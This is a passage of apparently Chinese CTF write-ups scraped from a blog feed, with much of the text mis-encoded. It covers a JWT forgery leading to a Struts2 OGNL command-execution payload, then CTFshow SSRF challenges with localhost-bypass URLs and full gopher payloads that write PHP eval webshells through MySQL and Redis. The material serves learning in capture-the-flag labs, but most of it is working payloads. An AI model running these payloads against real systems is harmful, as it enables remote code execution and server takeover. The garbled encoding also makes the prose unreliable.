åä¸º</p><blockquote><p>root%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25b8%2500%2500%2500%2500%2500%2500%2500abcd</p></blockquote><p>payload</p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210104769-1700990370543-206-1700994565105-178.png"></p><p>æ‹¿åˆ°key</p><blockquote><p>sk-he00lctf3r</p></blockquote><p>æŠ“åŒ…åŸé¡µé¢æ‹¿session</p><p><a href="https://jwt.io/">jwt</a></p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210217434-1700990370543-205-1700994565105-179.png"></p><p>åœ¨â€your-256-bit-secretâ€å¤„æ”¾å…¥ä½ çš„key</p><p>ä¿®æ”¹æ˜æ–‡ï¼Œå¯ä»¥æ‹¿åˆ°åŠ å¯†åçš„session</p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210132220-1700990370543-204-1700994565106-180.png"></p><p>ä¿®æ”¹sessionæ”¾åŒ…ï¼Œå‘ç°é¡µé¢è‡ªåŠ¨è·³è½¬åˆ°&#x2F;admiiiiiiiiiiin&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;do you know struts2?</span><br></pre></td></tr></table></figure><p>çœ‹åå­—å¯ä»¥çŸ¥é“æ˜¯</p><h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><p><a href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a></p><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œå¯ä»¥æ‰¾åˆ°ï¼ŒåŸæ¥çš„æ–‡ä»¶â€¦..å¯èƒ½æ²¡æœ‰ï¼Œå¯èƒ½æ²¡æœ‰äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>HOSTNAME&#x3D;27102e2d72c4LANGUAGE&#x3D;en_US:enJAVA_HOME&#x3D;&#x2F;opt&#x2F;java&#x2F;openjdkGPG_KEYS&#x3D;05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 5C3C5F3E314C866292F359A8F3AD5C94A67F707E 765908099ACF92702C7D949BFA0C35EA8AA299F1 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23PWD&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatTOMCAT_SHA512&#x3D;9e6770e9c9c3b630011c0f0e320b31bb0ea3700d52247a12d544ea25f9ee4d93613ad6ccb7939f97fb05e1760978a7547eccb16352d73fa28886134ba58f3f8cTOMCAT_MAJOR&#x3D;8HOME&#x3D;&#x2F;rootLANG&#x3D;en_US.UTF-8TOMCAT_NATIVE_LIBDIR&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libFLAG&#x3D;flag{7r0m_jwt_t0_struts2}CATALINA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatSHLVL&#x3D;0JDK_JAVA_OPTIONS&#x3D; â€“add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED â€“add-opens&#x3D;java.base&#x2F;java.io&#x3D;ALL-UNNAMED â€“add-opens&#x3D;java.base&#x2F;java.util&#x3D;ALL-UNNAMED â€“add-opens&#x3D;java.base&#x2F;java.util.concurrent&#x3D;ALL-UNNAMED â€“add-opens&#x3D;java.rmi&#x2F;sun.rmi.transport&#x3D;ALL-UNNAMEDLD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libLC_ALL&#x3D;en_US.UTF-8PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin:&#x2F;opt&#x2F;java&#x2F;openjdk&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binTOMCAT_VERSION&#x3D;8.5.91JAVA_VERSION&#x3D;jdk8u372-b07</p>]]></content>
      
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-CTFshow</title>
      <link href="/2023/07/22/SSRF%20%20web351-/"/>
      <url>/2023/07/22/SSRF%20%20web351-/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="SSRF-web351-web360"><a href="#SSRF-web351-web360" class="headerlink" title="SSRF  web351-web360"></a>SSRF  web351-web360</h1><p>å†™åœ¨å‰é¢ï¼šssrfå¸¸è§çš„ä¸€äº›å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl_init()ï¼šåˆå§‹curlä¼šè¯</span><br><span class="line">curl_setopt()ï¼šä¼šè¯è®¾ç½®</span><br><span class="line">curl_close()ï¼šä¼šè¯å…³é—­</span><br><span class="line">file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</span><br><span class="line">readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line">fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚</span><br><span class="line">curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</span><br><span class="line">fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URLã€‚</span><br></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>url&#x3D;<a href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a></p><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><p>url&#x3D;<a href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a></p><p>parse_url()è§£æè¯·æ±‚åŒ…çš„å‚æ•°ï¼Œè¿”å›æ•°ç»„ï¼Œschemeæ˜¯è¯·æ±‚åŒ…çš„åè®®</p><p>127.1ä¼šè¢«è§£ææˆ127.0.0.1ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸ºé›¶å¯ç¼ºçœ<br>åœ¨Linuxä¸­ï¼Œ0ä¹Ÿä¼šè¢«è§£ææˆ127.0.0.1<br>127.0.0.0&#x2F;8æ˜¯ä¸€ä¸ªç¯å›åœ°å€ç½‘æ®µï¼Œä»127.0.0.1 ~ 127.255.255.254éƒ½è¡¨ç¤ºlocalhost<br>ipåœ°å€è¿˜å¯ä»¥é€šè¿‡è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶çš„å½¢å¼è®¿é—®ï¼ŒIPåœ°å€äºŒè¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶äº’æ¢</p><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p>è¿™é¢˜é™åˆ¶äº†<code>http://[host]/[path]</code> hostéƒ¨åˆ†é•¿åº¦å°äº5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>hosté•¿åº¦è¦å°äº3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼æ¥å®šä¹‰æ¡ä»¶ï¼Œå…·ä½“æ¡ä»¶å¦‚ä¸‹ï¼š</p><ul><li><code>^</code>ï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚</li><li><code>http://ctf\.</code>ï¼šè¡¨ç¤ºä»¥ â€œ<a href="http://ctf/">http://ctf</a>.â€ å¼€å¤´ã€‚å…¶ä¸­ï¼Œ<code>.</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ <code>\</code> è¿›è¡Œè½¬ä¹‰ã€‚</li><li><code>.*</code>ï¼šè¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆé™¤æ¢è¡Œç¬¦å¤–ï¼‰çš„é›¶ä¸ªæˆ–å¤šä¸ªå®ä¾‹ã€‚</li><li><code>show$</code>ï¼šè¡¨ç¤ºä»¥ â€œshowâ€ ç»“å°¾ã€‚</li><li><code>/i</code>ï¼šè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚</li></ul><p>ç»¼åˆèµ·æ¥ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯åˆ¤æ–­ç»™å®šçš„ URL æ˜¯å¦ä»¥ â€œ<a href="http://ctf/">http://ctf</a>.â€ å¼€å¤´ï¼Œä»¥ â€œshowâ€ ç»“å°¾ï¼Œå¹¶ä¸”ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>å¦‚æœä¼ å…¥çš„ URL æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œå°±ä¼šæ‰§è¡Œ <code>echo file_get_contents($url);</code> çš„ä»£ç ï¼Œä½¿ç”¨ <code>file_get_contents()</code> å‡½æ•°è·å–è¯¥ URL çš„å†…å®¹ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°é¡µé¢ä¸Š</p><p>æƒ³è¦åšçš„è¾“å‡ºflag.phpæ— æ³•ä½œåˆ°åœ¨flag.PHPåé¢ç›´æ¥åŠ showï¼ŒåŠ ä¸€ä¸ªä¼ å‚çš„å½¢å¼å³å¯</p><p>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p><h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p>ç”¨åˆ°å·¥å…·<strong>åˆ©ç”¨gopheråè®®æ— å¯†ç æ³¨å…¥mysql</strong>ï¼Œä½¿ç”¨<a href="https://github.com/tarunkant/Gopherus">Gopheruså·¥å…·</a>æ„é€ payload</p><p>python gopherus.py  â€“exploit mysql</p><ul><li>é€‰æ‹©æ„å»ºmysqlçš„payload</li><li>è®¾ç½®ç”¨æˆ·åï¼Œé»˜è®¤root</li><li>sqlæ³¨å…¥ï¼Œå†™å…¥shellï¼Œè¿™é‡Œ<strong>ä½¿ç”¨äº†into outfileæ–°å»ºshellå¹¶å†™å…¥</strong></li><li>å¾—åˆ°payload</li></ul><p>ç™»é™†ç•Œé¢æ‰¾åˆ°ä¸€ä¸ªéšè—çš„æ”»å‡»ç‚¹ï¼Œå¯¹å…¶è¿›è¡ŒSSRFæ”»å‡»</p><p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213538810.png"></p><p>å°†ç”Ÿæˆçš„gopheré“¾æ¥ä½œä¸ºreturlçš„å‚æ•°ï¼Œå› ä¸º<code>_</code>åé¢çš„å†…å®¹æˆ–ç»è¿‡ä¸¤æ¬¡urlæäº¤ï¼Œæ‰€ä»¥éœ€è¦å†urlencodeä¸€æ¬¡ï¼šï¼ˆè®°å¾—åªç¼–ç ä¸‹åˆ’çº¿åé¢çš„ï¼Œå¦åˆ™å®¹æ˜“å‡ºé”™ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2561%255d%2529%253b%253f%253e%2527%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure><p> select â€˜<?php eval($_POST[cmd]);?>â€˜into outfile â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.phpâ€™;</p><p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213337033.png"></p><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>ssrfæ‰“Redis</p><p>å†™webshell</p><p>å†™sshå…¬é’¥</p><p>å†™contrabè®¡åˆ’åå¼¹shell</p><p>ä¸»ä»å¤åˆ¶</p><p>è¿™ä¸ªé¢˜ç›®ä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä¸Šä¸€é¢˜æ‰“MySQLè¿™ä¸€é¢˜æ‰“Redis</p><blockquote><p>ä»€ä¹ˆæ˜¯Redisæœªæˆæƒè®¿é—®ï¼Ÿ</p><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ &#x2F;root&#x2F;.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨</p><p>ç®€å•è¯´ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼šredis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘<br>æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡</p></blockquote><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712182723167.png"></p><p>è‹¥å‡ºç°æŠ¥é”™ï¼Œåˆ™è¯´æ˜å­˜åœ¨redisæœåŠ¡</p><p>ç”¨å·¥å…·åš</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712181653959.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>###å…¶ä»–ç»•è¿‡127çš„æ–¹æ³•</p><p>1.å¦‚æœç›®æ ‡ä»£ç é™åˆ¶è®¿é—®çš„åŸŸååªèƒ½ä¸º <a href="http://www.xxx.comï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼šhttp://www.xxx.com@www.evil.com">http://www.xxx.comï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼šhttp://www.xxx.com@www.evil.com</a> <a href="http://www.evil.com/">http://www.evil.com/</a></p><p>2.<a href="http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œå¦‚è®¿é—®ï¼šhttp://127.0.0.1.xip.io/flag.phpæ—¶ï¼Œå®é™…è®¿é—®çš„æ˜¯http://127.0.0.1/1.php">http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œå¦‚è®¿é—®ï¼šhttp://127.0.0.1.xip.io/flag.phpæ—¶ï¼Œå®é™…è®¿é—®çš„æ˜¯http://127.0.0.1/1.php</a> åƒè¿™æ ·çš„ç½‘å€è¿˜æœ‰ <a href="http://nip.io,http//sslip.io">http://nip.ioï¼Œhttp://sslip.io</a></p><p>3.çŸ­ç½‘å€ç›®å‰åŸºæœ¬éƒ½éœ€è¦ç™»å½•ä½¿ç”¨ï¼Œå¦‚ç¼©æˆ‘ï¼Œ<a 